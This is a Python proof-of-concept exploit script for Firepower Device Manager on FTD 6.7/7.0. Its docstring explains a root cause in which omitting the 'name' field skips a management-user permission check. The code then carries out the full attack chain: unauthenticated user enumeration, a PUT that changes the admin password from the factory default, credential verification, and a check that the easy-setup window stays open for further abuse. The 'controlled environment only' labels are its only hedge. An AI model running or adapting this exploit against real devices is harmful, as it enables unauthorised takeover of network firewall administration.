"""
F-FTD-64: FDM Unauthenticated Admin Password Change via User PUT null-name Bypass
CONTROLLED ENVIRONMENT ONLY

Root cause:
  UserResource.updateEntity() (Restlet REST handler for PUT /object/users/{uuid})
  guards MGMT user modification with this condition:

    if (user.getName() != null && !isSelf && containsUserServiceType(user, MGMT))
        throw FORBIDDEN

  During FDM easy setup (easySetupDone.txt absent), PUT /object/users/{uuid} is
  in easysetup-urls.json → unauthenticated access allowed by NgfwEasysetupDoneFilter.

  Attack: omit "name" from PUT body → user.getName() == null → FORBIDDEN check skipped
  → usersService.update() called on any user including admin (MGMT type).

  UserValidator.validateUpdate() checks for MGMT users:
    - password AND newPassword must both be provided (not masked)
    - passwords must differ
    - newPassword must pass complexity validation
    - userPreferences must be present
    - identitySourceId must == "e3e74c32-3c03-11e8-983b-95c21a1b6da9" (local source)
  No current-password verification at the Java validation layer.

  Difference from F-FTD-60:
    F-FTD-60: POST /devices/default/action/provision
      → changes password + creates easySetupDone.txt + runs firstBootInitialConfiguration
      → CLOSES easy setup window (filter starts blocking unauthenticated requests)
    F-FTD-64: PUT /object/users/{admin-uuid} with null name
      → changes password ONLY
      → does NOT create easySetupDone.txt
      → easy setup window REMAINS OPEN (all unauthenticated endpoints stay accessible)
      → attacker can continue abusing other easy setup endpoints after password change

Attack conditions:
  1. FTD management interface reachable on port 443
  2. /etc/sf/easySetupDone.txt absent (factory-fresh or factory-reset)
  3. FDM 6.7.x / 7.0.x

Attack chain:
  1. GET /api/fdm/v6/object/users (unauthenticated)
     → retrieve admin UUID, userPreferences, identitySourceId
  2. PUT /api/fdm/v6/object/users/{admin-uuid} (unauthenticated) with:
     - name: OMIT (null) -- bypasses MGMT FORBIDDEN check
     - password.encryptedString: "Admin123" (factory default)
     - newPassword.encryptedString: attacker-chosen
     - userPreferences: from step 1
     - identitySourceId: "e3e74c32-3c03-11e8-983b-95c21a1b6da9"
     - userServiceTypes: ["MGMT"]
  3. Login as admin with new password
  4. Easy setup window remains open → continue exploiting other unauth endpoints

Confirmed versions: FTD 6.7.0-65, FTD 7.0.0-94
  - easysetup-urls.json: /object/users/{uuid}: ["GET","PUT"] in both versions
  - UserResource.updateEntity() guard: same null-name bypass in both
"""

# CONTROLLED ENVIRONMENT ONLY

import requests
import sys
import json
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

FDM_API_BASE = "/api/fdm/v6"
USERS_PATH = f"{FDM_API_BASE}/object/users"
TOKEN_PATH = f"{FDM_API_BASE}/fdm/token"

# Local identity source UUID (hardcoded in FDM — same on all FTD)
LOCAL_IDENTITY_SOURCE_ID = "e3e74c32-3c03-11e8-983b-95c21a1b6da9"

# Factory default admin password
FACTORY_DEFAULT_PASSWORD = "Admin123"


def check_easy_setup_mode(host, port=443):
    """Confirm FDM is in easy setup mode (easySetupDone.txt absent)."""
    url = f"https://{host}:{port}{FDM_API_BASE}/operational/systeminfo/default"
    try:
        r = requests.get(url, verify=False, timeout=10)
        if r.status_code == 200:
            info = r.json()
            print(f"[+] Easy setup mode active — /systeminfo accessible without auth")
            print(f"    Model: {info.get('model', '?')} | SW: {info.get('softwareVersion', '?')}")
            return True
        print(f"[-] Not in easy setup mode (status {r.status_code})")
        return False
    except Exception as e:
        print(f"[-] Error: {e}")
        return False


def enumerate_users(host, port=443):
    """GET /object/users unauthenticated — retrieve admin UUID and preferences."""
    url = f"https://{host}:{port}{USERS_PATH}"
    try:
        r = requests.get(url, verify=False, timeout=10)
        if r.status_code != 200:
            print(f"[-] User enumeration failed: {r.status_code}")
            return None

        data = r.json()
        items = data.get('items', [])
        print(f"[+] Unauthenticated user list: {len(items)} user(s)")

        admin_user = None
        for u in items:
            service_types = [st.get('serviceType', st) if isinstance(st, dict) else st
                             for st in u.get('userServiceTypes', [])]
            print(f"    UUID: {u.get('id', '?')} | Name: {u.get('name', '?')} | Types: {service_types}")
            if 'MGMT' in str(service_types) or u.get('name') == 'admin':
                admin_user = u

        if admin_user:
            print(f"\n[+] Admin user (MGMT): UUID={admin_user.get('id', '?')}")
        return admin_user

    except Exception as e:
        print(f"[-] Error: {e}")
        return None


def exploit_user_put(host, admin_user, new_password, current_password=None, port=443):
    """
    PUT /object/users/{uuid} with null name — bypasses MGMT FORBIDDEN check.
    Changes admin password without closing easy setup.

    CONTROLLED ENVIRONMENT ONLY
    """
    if current_password is None:
        current_password = FACTORY_DEFAULT_PASSWORD

    admin_uuid = admin_user.get('id')
    if not admin_uuid:
        print(f"[-] No admin UUID found")
        return False

    url = f"https://{host}:{port}{USERS_PATH}/{admin_uuid}"

    # Critical: omit "name" field entirely — user.getName() returns null
    # → UserResource FORBIDDEN check: name != null condition is FALSE → bypassed
    body = {
        "id": admin_uuid,
        # "name": INTENTIONALLY OMITTED — null bypass
        "type": "user",
        "password": {
            "encryptedString": current_password
        },
        "newPassword": {
            "encryptedString": new_password
        },
        "identitySourceId": LOCAL_IDENTITY_SOURCE_ID,
        "userServiceTypes": ["MGMT"],
    }

    # Include userPreferences if available (required by UserValidator for MGMT)
    if admin_user.get('userPreferences'):
        body["userPreferences"] = admin_user['userPreferences']

    print(f"\n[*] Sending unauthenticated PUT to {url}")
    print(f"    name field: OMITTED (null — bypasses MGMT FORBIDDEN check)")
    print(f"    currentPassword: {current_password}")
    print(f"    newPassword: {new_password}")
    print(f"    identitySourceId: {LOCAL_IDENTITY_SOURCE_ID}")

    try:
        r = requests.put(
            url,
            json=body,
            verify=False,
            timeout=30,
            headers={"Content-Type": "application/json"}
        )

        print(f"\n[*] Response: {r.status_code}")
        if r.status_code in (200, 201):
            print(f"[!] SUCCESS — admin password changed to: {new_password}")
            print(f"    NOTE: easySetupDone.txt NOT created — easy setup window remains open")
            print(f"    All unauthenticated endpoints remain accessible")
            return True
        elif r.status_code == 403:
            print(f"[-] 403 FORBIDDEN — null-name bypass may have failed or device configured")
            print(f"    Body: {r.text[:300]}")
        elif r.status_code == 400:
            body_text = r.text[:500]
            print(f"[-] 400 Bad Request — validator rejected input")
            print(f"    Body: {body_text}")
            if 'invalidPasswordCombination' in body_text:
                print(f"    [!] Both password AND newPassword required (not masked)")
            if 'userPreferenceNotFound' in body_text:
                print(f"    [!] userPreferences missing — include from GET /object/users")
        else:
            print(f"[-] Unexpected status {r.status_code}")
            print(f"    Body: {r.text[:300]}")
        return False

    except Exception as e:
        print(f"[-] Error: {e}")
        return False


def verify_new_credentials(host, new_password, port=443):
    """Verify new admin password authenticates successfully."""
    url = f"https://{host}:{port}{TOKEN_PATH}"
    body = {
        "grant_type": "password",
        "username": "admin",
        "password": new_password
    }
    try:
        r = requests.post(url, json=body, verify=False, timeout=15)
        if r.status_code == 200:
            data = r.json()
            token = data.get('access_token', '')[:40]
            print(f"[!] VERIFIED — admin:{new_password} authenticated")
            print(f"    Access token: {token}...")
            return True
        else:
            print(f"[-] Auth verification failed: {r.status_code}")
            return False
    except Exception as e:
        print(f"[-] Error: {e}")
        return False


def check_easy_setup_still_open(host, port=443):
    """Confirm easy setup window is still open after password change (key differentiator from F-FTD-60)."""
    url = f"https://{host}:{port}{FDM_API_BASE}/operational/systeminfo/default"
    try:
        r = requests.get(url, verify=False, timeout=10)
        if r.status_code == 200:
            print(f"[!] CONFIRMED: Easy setup window still OPEN after password change")
            print(f"    easySetupDone.txt was NOT created (unlike F-FTD-60)")
            print(f"    All easysetup-urls.json endpoints remain unauthenticated")
            return True
        else:
            print(f"[*] Easy setup appears closed (status {r.status_code})")
            return False
    except Exception as e:
        print(f"[-] Error: {e}")
        return False


if __name__ == '__main__':
    print("=" * 70)
    print("F-FTD-64: FDM Unauthenticated User PUT null-name MGMT Bypass")
    print("CONTROLLED ENVIRONMENT ONLY")
    print("=" * 70)
    print("""
Key difference from F-FTD-60 (provision endpoint):
  F-FTD-60 closes easy setup (creates easySetupDone.txt + runs firstBoot)
  F-FTD-64 changes admin password ONLY — easy setup remains open
  Attacker preserves unauthenticated access to all easy setup endpoints

Bypass mechanism:
  UserResource.updateEntity():
    if (user.getName() != null && !isSelf && containsUserServiceType(MGMT))
        throw FORBIDDEN;
  Omit "name" in PUT body → getName() returns null → check skipped
""")

    if len(sys.argv) < 3:
        print(f"Usage: {sys.argv[0]} <fdm-host> <new-admin-password> [current-password]")
        print(f"  current-password default: {FACTORY_DEFAULT_PASSWORD}")
        sys.exit(1)

    host = sys.argv[1]
    new_password = sys.argv[2]
    current_password = sys.argv[3] if len(sys.argv) > 3 else None

    print(f"\n[*] Target: {host}:443")

    print("\n--- Phase 1: Confirm easy setup mode ---")
    if not check_easy_setup_mode(host):
        print("[!] Not in easy setup mode. Exiting.")
        sys.exit(1)

    print("\n--- Phase 2: Enumerate users (unauthenticated) ---")
    admin_user = enumerate_users(host)
    if not admin_user:
        print("[!] Could not retrieve admin user. Exiting.")
        sys.exit(1)

    print("\n--- Phase 3: Exploit — PUT with null name bypass ---")
    success = exploit_user_put(host, admin_user, new_password, current_password)

    if success:
        print("\n--- Phase 4: Verify new credentials ---")
        verify_new_credentials(host, new_password)

        print("\n--- Phase 5: Verify easy setup window still open ---")
        check_easy_setup_still_open(host)

    print("\n[*] Done. CONTROLLED ENVIRONMENT ONLY.")
